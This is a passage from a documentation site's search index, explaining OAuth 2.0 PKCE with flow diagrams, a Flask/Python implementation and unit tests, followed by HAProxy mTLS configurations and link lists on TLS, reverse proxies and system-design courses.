\u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     X  INTERCEPTED BY MALICIOUS APP!                         \u2502\n     \u2502                                                         \u2502\n\u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                          \u2502\n\u2502  Malicious App   \u2502                                          \u2502\n\u2502  (registered     \u2502                                          \u2502\n\u2502   myapp://)      \u2502                                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                          \u2502\n     \u2502                                                         \u2502\n     \u2502 (3) Exchange code for token                            \u2502\n     \u2502    (no secret needed for public clients)               \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502 (4) Access token (COMPROMISED!)                        \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n</code></pre></p>"},{"location":"security/oauth/#how-pkce-works","title":"How PKCE Works","text":"<p>PKCE adds a cryptographic challenge to the authorization flow:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     PKCE Flow                                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502\n\u2502  (Mobile App)    \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 (1) Generate code_verifier (random string)\n     \u2502     code_verifier = \"dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\"\n     \u2502\n     \u2502 (2) Generate code_challenge\n     \u2502     code_challenge = BASE64URL(SHA256(code_verifier))\n     \u2502     code_challenge = \"E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\"\n     \u2502\n     \u2502 (3) Authorization request with code_challenge\n     \u2502     /authorize?\n     \u2502       response_type=code\n     \u2502       &amp;client_id=CLIENT_ID\n     \u2502       &amp;redirect_uri=myapp://callback\n     \u2502       &amp;code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\n     \u2502       &amp;code_challenge_method=S256\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User (Browser)  \u2502                              \u2502  Authorization   \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                              \u2502     Server       \u2502\n     \u2502                                            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                     \u2502\n     \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6   \u2502\n     \u2502                                                     \u2502\n     \u2502                                                     \u2502 (4) Store code_challenge\n     \u2502                                                     \u2502     with authorization code\n     \u2502                                                     \u2502\n     \u2502 (5) Redirect: myapp://callback?code=AUTH_CODE      \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n     \u2502                                                     \u2502\n     \u25bc                                                     \u2502\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                      \u2502\n\u2502     Client       \u2502                                      \u2502\n\u2502  (Mobile App)    \u2502                                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                      \u2502\n     \u2502                                                     \u2502\n     \u2502 (6) Token request with original code_verifier      \u2502\n     \u2502     POST /token                                    \u2502\n     \u2502       grant_type=authorization_code                \u2502\n     \u2502       &amp;code=AUTH_CODE                              \u2502\n     \u2502       &amp;redirect_uri=myapp://callback               \u2502\n     \u2502       &amp;client_id=CLIENT_ID                         \u2502\n     \u2502       &amp;code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU... \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                     \u2502\n     \u2502                                                     \u2502 (7) Verify:\n     \u2502                                                     \u2502     SHA256(code_verifier)\n     \u2502                                                     \u2502     == code_challenge\n     \u2502                                                     \u2502\n     \u2502 (8) Return access_token (only if verified!)        \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2502\n     \u2502                                                     \u2502\n     \u25bc                                                     \u25bc\n</code></pre> <p>PKCE Parameters:</p> <ol> <li>code_verifier: </li> <li>Random cryptographic string (43-128 characters)</li> <li>Created by client, kept secret</li> <li> <p>Example: <code>dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk</code></p> </li> <li> <p>code_challenge:</p> </li> <li>Derived from code_verifier</li> <li>Sent in authorization request</li> <li>Method: <code>plain</code> or <code>S256</code> (SHA-256 hash)</li> <li> <p>Example: <code>BASE64URL(SHA256(code_verifier))</code></p> </li> <li> <p>code_challenge_method:</p> </li> <li><code>S256</code>: SHA-256 hash (recommended)</li> <li><code>plain</code>: Use verifier as-is (not recommended)</li> </ol>"},{"location":"security/oauth/#pkce-security-benefits","title":"PKCE Security Benefits","text":"<p>Protection Against Interception: <pre><code>Even if authorization code is intercepted:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Malicious App     \u2502\n\u2502  (has auth code)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 (1) Tries to exchange code for token\n     \u2502     POST /token\n     \u2502       code=INTERCEPTED_CODE\n     \u2502       client_id=CLIENT_ID\n     \u2502       (no code_verifier!)\n     \u2502\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Authorization   \u2502\n\u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 (2) REJECTED!\n     \u2502     - Missing code_verifier\n     \u2502     - OR wrong code_verifier\n     \u2502     - Cannot generate valid code_challenge\n     \u2502\n     \u25bc\n     X  Attack prevented!\n</code></pre></p> <p>Key Security Properties:</p> <ol> <li>Dynamic Secret: </li> <li>New code_verifier for each authorization flow</li> <li> <p>Cannot be pre-computed or reused</p> </li> <li> <p>One-way Function:</p> </li> <li>code_challenge derived from code_verifier (SHA-256)</li> <li> <p>Cannot reverse-engineer verifier from challenge</p> </li> <li> <p>Client Binding:</p> </li> <li>Only the client that started the flow can complete it</li> <li> <p>Intercepted code is useless without verifier</p> </li> <li> <p>No Shared Secrets:</p> </li> <li>No client_secret needed</li> <li>Perfect for public clients</li> </ol>"},{"location":"security/oauth/#pkce-vs-standard-oauth-20","title":"PKCE vs Standard OAuth 2.0","text":"Aspect Standard OAuth 2.0 OAuth 2.0 + PKCE Client Secret Required for confidential clients Not required Code Interception Vulnerable Protected Public Clients Less secure Highly secure Mobile Apps Risky Recommended SPAs Implicit flow (deprecated) Authorization Code + PKCE Complexity Simpler Slightly more complex Security Good for confidential clients Excellent for all clients"},{"location":"security/oauth/#when-to-use-pkce","title":"When to Use PKCE","text":"<p>\u2705 Always Use PKCE For: - Mobile applications (iOS, Android) - Single Page Applications (SPAs) - Desktop applications - Any public client that cannot securely store secrets</p> <p>\u2705 Recommended Even For: - Server-side web applications (defense in depth) - All new OAuth 2.0 implementations</p> <p>\u274c Not Applicable For: - Client Credentials flow (no user interaction) - Resource Owner Password flow (deprecated)</p>"},{"location":"security/oauth/#implementation-example","title":"Implementation Example","text":"<p>Step 1: Generate Code Verifier and Challenge <pre><code>// Generate code_verifier (random string)\nfunction generateCodeVerifier() {\n  const array = new Uint8Array(32);\n  crypto.getRandomValues(array);\n  return base64URLEncode(array);\n}\n\n// Generate code_challenge from verifier\nasync function generateCodeChallenge(verifier) {\n  const encoder = new TextEncoder();\n  const data = encoder.encode(verifier);\n  const hash = await crypto.subtle.digest('SHA-256', data);\n  return base64URLEncode(new Uint8Array(hash));\n}\n</code></pre></p> <p>Step 2: Authorization Request <pre><code>GET /authorize?\n  response_type=code&amp;\n  client_id=YOUR_CLIENT_ID&amp;\n  redirect_uri=https://yourapp.com/callback&amp;\n  scope=read:user&amp;\n  state=random_state&amp;\n  code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&amp;\n  code_challenge_method=S256\n</code></pre></p> <p>Step 3: Token Request <pre><code>POST /token\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&amp;\ncode=AUTHORIZATION_CODE&amp;\nredirect_uri=https://yourapp.com/callback&amp;\nclient_id=YOUR_CLIENT_ID&amp;\ncode_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\n</code></pre></p>"},{"location":"security/oauth/#summary","title":"Summary","text":"<p>PKCE is a critical security enhancement for OAuth 2.0 that: - \u2705 Prevents authorization code interception attacks - \u2705 Eliminates need for client secrets in public clients - \u2705 Provides cryptographic binding between authorization and token requests - \u2705 Is now recommended for ALL OAuth 2.0 clients - \u2705 Is mandatory for SPAs and mobile apps</p> <p>Best Practice: Always use PKCE with Authorization Code flow for modern applications.</p>"},{"location":"security/oauth/#complete-python-implementation","title":"Complete Python Implementation","text":"<pre><code>import secrets\nimport hashlib\nimport base64\nimport requests\nfrom urllib.parse import urlencode, urlparse, parse_qs\nfrom flask import Flask, request, redirect, session, jsonify\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)\n\n# OAuth 2.0 Configuration\nCLIENT_ID = 'your_client_id'\nAUTHORIZATION_URL = 'https://auth-server.com/oauth/authorize'\nTOKEN_URL = 'https://auth-server.com/oauth/token'\nREDIRECT_URI = 'http://localhost:5000/callback'\nSCOPE = 'read:user write:user'\n\nclass PKCEHelper:\n    \"\"\"Helper class for PKCE implementation\"\"\"\n\n    @staticmethod\n    def generate_code_verifier(length: int = 128) -&gt; str:\n        \"\"\"Generate a cryptographically random code verifier.\n\n        Args:\n            length: Length of verifier (43-128 characters)\n\n        Returns:\n            URL-safe base64 encoded string\n        \"\"\"\n        if length &lt; 43 or length &gt; 128:\n            raise ValueError('Code verifier length must be between 43 and 128')\n\n        # Generate random bytes\n        random_bytes = secrets.token_bytes(length)\n\n        # Base64 URL encode (without padding)\n        code_verifier = base64.urlsafe_b64encode(random_bytes).decode('utf-8')\n        code_verifier = code_verifier.rstrip('=')\n\n        # Ensure length is within bounds\n        return code_verifier[:length]\n\n    @staticmethod\n    def generate_code_challenge(code_verifier: str, method: str = 'S256') -&gt; str:\n        \"\"\"Generate code challenge from verifier.\n\n        Args:\n            code_verifier: The code verifier string\n            method: 'S256' (SHA-256) or 'plain'\n\n        Returns:\n            Code challenge string\n        \"\"\"\n        if method == 'S256':\n            # SHA-256 hash\n            digest = hashlib.sha256(code_verifier.encode('utf-8')).digest()\n            # Base64 URL encode (without padding)\n            code_challenge = base64.urlsafe_b64encode(digest).decode('utf-8')\n            return code_challenge.rstrip('=')\n        elif method == 'plain':\n            # Use verifier as-is (not recommended)\n            return code_verifier\n        else:\n            raise ValueError(f'Unsupported method: {method}')\n\n@app.route('/login')\ndef login():\n    \"\"\"Initiate OAuth 2.0 with PKCE flow\"\"\"\n    # Generate PKCE parameters\n    code_verifier = PKCEHelper.generate_code_verifier()\n    code_challenge = PKCEHelper.generate_code_challenge(code_verifier, 'S256')\n\n    # Store code_verifier in session (needed for token exchange)\n    session['code_verifier'] = code_verifier\n\n    # Generate state for CSRF protection\n    state = secrets.token_urlsafe(32)\n    session['oauth_state'] = state\n\n    # Build authorization URL with PKCE parameters\n    params = {\n        'response_type': 'code',\n        'client_id': CLIENT_ID,\n        'redirect_uri': REDIRECT_URI,\n        'scope': SCOPE,\n        'state': state,\n        'code_challenge': code_challenge,\n        'code_challenge_method': 'S256'\n    }\n\n    authorization_url = f\"{AUTHORIZATION_URL}?{urlencode(params)}\"\n    return redirect(authorization_url)\n\n@app.route('/callback')\ndef callback():\n    \"\"\"Handle OAuth callback and exchange code for token with PKCE\"\"\"\n    # Verify state parameter\n    state = request.args.get('state')\n    if state != session.get('oauth_state'):\n        return jsonify({'error': 'Invalid state parameter'}), 400\n\n    # Get authorization code\n    code = request.args.get('code')\n    if not code:\n        error = request.args.get('error', 'Unknown error')\n        error_description = request.args.get('error_description', '')\n        return jsonify({\n            'error': error,\n            'error_description': error_description\n        }), 400\n\n    # Retrieve code_verifier from session\n    code_verifier = session.get('code_verifier')\n    if not code_verifier:\n        return jsonify({'error': 'Missing code verifier'}), 400\n\n    # Exchange authorization code for access token with code_verifier\n    token_data = {\n        'grant_type': 'authorization_code',\n        'code': code,\n        'redirect_uri': REDIRECT_URI,\n        'client_id': CLIENT_ID,\n        'code_verifier': code_verifier  # PKCE parameter\n    }\n\n    # Note: No client_secret needed for public clients with PKCE!\n\n    response = requests.post(TOKEN_URL, data=token_data)\n\n    if response.status_code == 200:\n        tokens = response.json()\n\n        # Clear PKCE parameters from session\n        session.pop('code_verifier', None)\n        session.pop('oauth_state', None)\n\n        # Store tokens securely\n        session['access_token'] = tokens['access_token']\n        session['refresh_token'] = tokens.get('refresh_token')\n\n        return jsonify({\n            'message': 'Authentication successful',\n            'access_token': tokens['access_token'][:20] + '...',  # Truncated for display\n            'token_type': tokens.get('token_type', 'Bearer'),\n            'expires_in': tokens.get('expires_in')\n        })\n    else:\n        error_data = response.json()\n        return jsonify({\n            'error': 'Token exchange failed',\n            'details': error_data\n        }), 400\n\n@app.route('/api/protected')\ndef protected_resource():\n    \"\"\"Access protected resource using access token\"\"\"\n    access_token = session.get('access_token')\n    if not access_token:\n        return jsonify({'error': 'Not authenticated'}), 401\n\n    # Call protected API\n    headers = {'Authorization': f'Bearer {access_token}'}\n    response = requests.get('https://api-server.com/user', headers=headers)\n\n    if response.status_code == 200:\n        return response.json()\n    elif response.status_code == 401:\n        return jsonify({'error': 'Token expired or invalid'}), 401\n    else:\n        return jsonify({'error': 'API call failed'}), response.status_code\n\n# Standalone PKCE Client for Mobile/Desktop Apps\nclass PKCEOAuthClient:\n    \"\"\"Complete PKCE OAuth 2.0 client for public applications\"\"\"\n\n    def __init__(self, client_id: str, authorization_url: str, \n                 token_url: str, redirect_uri: str):\n        self.client_id = client_id\n        self.authorization_url = authorization_url\n        self.token_url = token_url\n        self.redirect_uri = redirect_uri\n        self.code_verifier = None\n        self.access_token = None\n        self.refresh_token = None\n\n    def get_authorization_url(self, scope: str = '', state: str = None) -&gt; str:\n        \"\"\"Generate authorization URL with PKCE parameters\"\"\"\n        # Generate PKCE parameters\n        self.code_verifier = PKCEHelper.generate_code_verifier()\n        code_challenge = PKCEHelper.generate_code_challenge(self.code_verifier)\n\n        if not state:\n            state = secrets.token_urlsafe(32)\n\n        params = {\n            'response_type': 'code',\n            'client_id': self.client_id,\n            'redirect_uri': self.redirect_uri,\n            'scope': scope,\n            'state': state,\n            'code_challenge': code_challenge,\n            'code_challenge_method': 'S256'\n        }\n\n        return f\"{self.authorization_url}?{urlencode(params)}\", state\n\n    def exchange_code_for_token(self, authorization_code: str) -&gt; dict:\n        \"\"\"Exchange authorization code for access token using PKCE\"\"\"\n        if not self.code_verifier:\n            raise Exception('No code verifier available. Call get_authorization_url first.')\n\n        token_data = {\n            'grant_type': 'authorization_code',\n            'code': authorization_code,\n            'redirect_uri': self.redirect_uri,\n            'client_id': self.client_id,\n            'code_verifier': self.code_verifier\n        }\n\n        response = requests.post(self.token_url, data=token_data)\n\n        if response.status_code == 200:\n            tokens = response.json()\n            self.access_token = tokens['access_token']\n            self.refresh_token = tokens.get('refresh_token')\n            return tokens\n        else:\n            raise Exception(f'Token exchange failed: {response.text}')\n\n    def call_api(self, api_url: str, method: str = 'GET', data: dict = None) -&gt; dict:\n        \"\"\"Make authenticated API request\"\"\"\n        if not self.access_token:\n            raise Exception('Not authenticated')\n\n        headers = {'Authorization': f'Bearer {self.access_token}'}\n\n        if method == 'GET':\n            response = requests.get(api_url, headers=headers)\n        elif method == 'POST':\n            response = requests.post(api_url, headers=headers, json=data)\n        else:\n            raise ValueError(f'Unsupported method: {method}')\n\n        response.raise_for_status()\n        return response.json()\n\n# Usage Example for Mobile/Desktop App\nif __name__ == '__main__':\n    # Example 1: Flask Web App\n    print(\"Starting Flask app with PKCE support...\")\n    print(\"Visit http://localhost:5000/login to test\")\n    # app.run(debug=True, port=5000)\n\n    # Example 2: Standalone Client (Mobile/Desktop)\n    print(\"\\n\" + \"=\"*60)\n    print(\"Standalone PKCE Client Example\")\n    print(\"=\"*60)\n\n    client = PKCEOAuthClient(\n        client_id='mobile-app-client-id',\n        authorization_url='https://auth-server.com/oauth/authorize',\n        token_url='https://auth-server.com/oauth/token',\n        redirect_uri='myapp://callback'\n    )\n\n    # Step 1: Generate authorization URL\n    auth_url, state = client.get_authorization_url(scope='read:user write:user')\n    print(f\"\\n1. Open this URL in browser:\\n{auth_url}\\n\")\n    print(f\"State (store this): {state}\\n\")\n\n    # Step 2: After user authorizes, get the code from redirect\n    # In a real app, this would come from the redirect handler\n    authorization_code = input(\"2. Enter the authorization code from redirect: \")\n\n    try:\n        # Step 3: Exchange code for token\n        tokens = client.exchange_code_for_token(authorization_code)\n        print(f\"\\n\u2705 Authentication successful!\")\n        print(f\"Access Token: {tokens['access_token'][:20]}...\")\n        print(f\"Token Type: {tokens.get('token_type')}\")\n        print(f\"Expires In: {tokens.get('expires_in')} seconds\")\n\n        # Step 4: Call protected API\n        user_data = client.call_api('https://api-server.com/user')\n        print(f\"\\nUser Data: {user_data}\")\n\n    except Exception as e:\n        print(f\"\\n\u274c Error: {e}\")\n</code></pre> <p>Key Security Features in Implementation:</p> <ol> <li>Cryptographically Random Verifier: Uses <code>secrets</code> module for secure random generation</li> <li>SHA-256 Challenge: One-way hash prevents reverse engineering</li> <li>No Client Secret: Safe for public clients (mobile/SPA)</li> <li>State Parameter: CSRF protection</li> <li>Session Security: Secure storage of code_verifier during flow</li> <li>URL-Safe Encoding: Proper base64 URL encoding without padding</li> </ol> <p>Testing the Implementation:</p> <pre><code># Unit tests for PKCE functions\nimport unittest\n\nclass TestPKCE(unittest.TestCase):\n    def test_code_verifier_length(self):\n        verifier = PKCEHelper.generate_code_verifier()\n        self.assertTrue(43 &lt;= len(verifier) &lt;= 128)\n\n    def test_code_challenge_s256(self):\n        verifier = \"dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk\"\n        challenge = PKCEHelper.generate_code_challenge(verifier, 'S256')\n        expected = \"E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM\"\n        self.assertEqual(challenge, expected)\n\n    def test_code_challenge_plain(self):\n        verifier = \"test_verifier\"\n        challenge = PKCEHelper.generate_code_challenge(verifier, 'plain')\n        self.assertEqual(challenge, verifier)\n\n    def test_url_safe_encoding(self):\n        verifier = PKCEHelper.generate_code_verifier()\n        # Should not contain +, /, or =\n        self.assertNotIn('+', verifier)\n        self.assertNotIn('/', verifier)\n        self.assertNotIn('=', verifier)\n\nif __name__ == '__main__':\n    unittest.main()\n</code></pre>"},{"location":"security/rbac/","title":"Role based Access Control","text":""},{"location":"security/rbac/#youtube","title":"Youtube","text":"<ul> <li>Master Role-Based Access Control Patterns</li> </ul>"},{"location":"security/ssl/","title":"SSL","text":""},{"location":"security/ssl/#youtube","title":"Youtube","text":"<ul> <li>How SSL Certificate Works? - HTTPS Explained</li> </ul>"},{"location":"security/sso/","title":"Single Sign On","text":""},{"location":"security/sso/#youtube","title":"Youtube","text":"<ul> <li>Build Your Own SSO | What is SSO | SSO Explained</li> </ul>"},{"location":"security/certificate/links/","title":"Openssl","text":""},{"location":"security/certificate/links/#blogs-and-websites","title":"Blogs and Websites","text":"<ul> <li>A complete overview of SSL/TLS and its cryptographic system</li> <li>What is the Certificate Chain of Trust?</li> <li>Self Signed Certificate with Custom Root CA</li> <li>What is a Self-Signed Certificate? Advantages, Risks &amp; Alternatives</li> <li>How does a ROOT CA verify a signature?</li> <li>Create Your Own SSL Certificate Authority for Local HTTPS Development</li> <li>How to create &amp; sign SSL/TLS certificates</li> <li>Creating a server certificate</li> <li>Restrict API Access With Client Certificates (mTLS)</li> <li>Manually Generate a Certificate Signing Request (CSR) Using OpenSSL</li> <li>How To Generate A CSR For A Multi-Domain SSL Certificate Using OpenSSL?</li> </ul>"},{"location":"security/certificate/links/#youtube","title":"Youtube","text":"<ul> <li>videos</li> <li>What are SSL/TLS Certificates? Why do we Need them? and How do they Work?</li> <li>How does HTTPS work? What's a CA? What's a self-signed Certificate?</li> <li>A complete overview of SSL/TLS and its cryptographic system</li> <li>HTTP Strict Transport Security (HSTS) and TLS Stripping Explained</li> <li>HTTPS, SSL, TLS &amp; Certificate Authority Explained</li> <li>Secure your Cloud Services with TLS X.509 Client Certificates</li> <li>TLS Handshake - EVERYTHING that happens when you visit an HTTPS website</li> <li>playlist</li> <li>Learn about HTTPS, TLS &amp; Certificates</li> <li>OpenSSL Tutorials | Cyber Hashira</li> <li>Practical TLS - Free Lessons from my SSL Deep Dive training course</li> <li>Sunny Classroom<ul> <li>Basic Cryptography</li> <li>Advanced Cryptography</li> <li>Public Key Infrastructure</li> </ul> </li> <li>certificates</li> <li>Digital Certificates Explained - How digital certificates bind owners to their public key</li> <li>What is SSL &amp; TLS ? What is HTTPS ? What is an SSL VPN?</li> <li>What is SSL | Man in the middle attack | SSL vs TLS | SSL handshake explained wid example</li> <li>A complete overview of SSL/TLS and its cryptographic system<ul> <li>A complete overview of SSL/TLS and its cryptographic system</li> </ul> </li> <li>Create &amp; sign SSL/TLS certificates with openssl<ul> <li>How to create &amp; sign SSL/TLS certificates</li> </ul> </li> <li>Create and sign certs with OpenSSL</li> <li>How to create a valid self signed SSL Certificate?</li> <li>Masterclass in openSSL</li> <li>Create Your Own Certificate Authority with XCA</li> <li>Certificates from Scratch - X.509 Certificates explained</li> <li>Server Certificates - Self Signed and LetsEncrypt Certificates for the LAN</li> </ul>"},{"location":"security/reverse-proxy/haproxy/","title":"HAProxy basics","text":""},{"location":"security/reverse-proxy/haproxy/#config-file","title":"config file","text":"<p>Create a cfg file and add the following contents</p> <p>Sample config <pre><code>frontend https-in\n    bind *:80\n    bind *:443  ssl crt server-cert.crt verify required ca-file intermediate-client-ca.crt ca-verify-file client-root-ca.crt\n    http-request redirect scheme https unless { ssl_fc }\n    default_backend apiservers\n</code></pre></p> <p>Advanced config with certificates <pre><code>defaults\n   mode http\n   timeout connect 5000\n   timeout client 50000\n   timeout server 50000\n\nfrontend echo-fontend\n   bind *:443 ssl crt server-cert.pem verify required ca-file intermediate.crt alpn h2,http/1.1\n   mode http\n   default_backend echo-backend\n   option forwardfor\n   option http-server-close\n   http-request set-header X-Client-Certificate %[ssl_c_der,base64]\n   http-request set-header X-SSL-Client-Cert          %{+Q}[ssl_c_der,base64]\n   http-request set-header X-SSL-Client-CN            %{+Q}[ssl_c_s_dn(cn)]\n   http-request set-header X-SSL-Client-Verify        %[ssl_c_verify]\n\nbackend echo-backend\n   mode http\n   server echo 127.0.0.1:8000\n</code></pre></p>"},{"location":"security/reverse-proxy/haproxy/#sample-blogs-and-configs","title":"Sample blogs and configs","text":"<ul> <li>test.cfg</li> <li>Restrict API Access With Client Certificates (mTLS)</li> <li>Client Certificate Authentication with HAProxy</li> </ul>"},{"location":"security/reverse-proxy/haproxy/#youtube-videos","title":"Youtube videos","text":"<ul> <li>HAProxy Basics</li> <li>HAProxy</li> </ul>"},{"location":"security/reverse-proxy/introduction/","title":"Reverse proxy","text":""},{"location":"security/reverse-proxy/introduction/#introduction","title":"introduction","text":"<ul> <li>Forward proxy vs reverse proxy</li> <li>Proxy vs reverse proxy vs load balancer (2023) | Explained with real life examples</li> </ul>"},{"location":"security/reverse-proxy/nginx/","title":"Nginx","text":""},{"location":"security/reverse-proxy/nginx/#youtube","title":"Youtube","text":"<ul> <li>Wait... Nginx can do WHAT?!</li> <li>nginx personal</li> </ul>"},{"location":"security/reverse-proxy/nginx/#udemy","title":"Udemy","text":"<ul> <li>NGINX Fundamentals: High Performance Servers from Scratch</li> </ul>"},{"location":"security/reverse-proxy/nginx/#others","title":"Others","text":"<ul> <li>Nginx UI</li> <li>Nginx Playground</li> <li>Docker Images</li> <li>nginx</li> <li>nginx:alpine</li> <li>nginx:alpine-slim</li> </ul>"},{"location":"system-design/courses/","title":"Courses","text":""},{"location":"system-design/courses/#website-courses","title":"Website Courses","text":"<ul> <li>hellointerview</li> <li>bytebytego</li> <li>techprep.app</li> <li>System Design School</li> <li>Grokking the System Design Interview</li> <li> <p>System Design Interviews</p> </li> <li> <p>codecrafters</p> </li> <li> <p>boot.dev</p> </li> <li> <p>Coursera</p> </li> <li>Udacity</li> <li>Free Programming Courses with Certification</li> </ul>"},{"location":"system-design/courses/#udemy","title":"Udemy","text":""},{"location":"system-design/courses/#hussein-nasser","title":"Hussein Nasser","text":"<ul> <li>Fundamentals of Operating Systems</li> <li>Fundamentals of Backend Engineering</li> <li>Fundamentals of Database Engineering</li> <li>Fundamentals of Network Engineering</li> <li>Troubleshooting Backend Performance</li> 